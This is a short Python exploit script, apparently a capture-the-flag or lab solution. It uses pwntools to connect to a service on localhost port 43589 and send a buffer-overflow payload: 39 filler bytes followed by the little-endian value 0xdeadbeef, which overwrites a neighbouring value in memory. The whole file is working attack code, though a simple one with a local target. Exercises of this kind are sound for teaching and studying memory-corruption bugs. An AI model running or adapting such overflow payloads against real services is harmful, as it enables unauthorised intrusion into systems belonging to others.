from pwn import *


address = ("127.0.0.1", 43589)
payload = b"a" * 0x27 + b"\xef\xbe\xad\xde"

conn = remote(address[0], address[1])
conn.sendline(payload)
print(conn.recvall())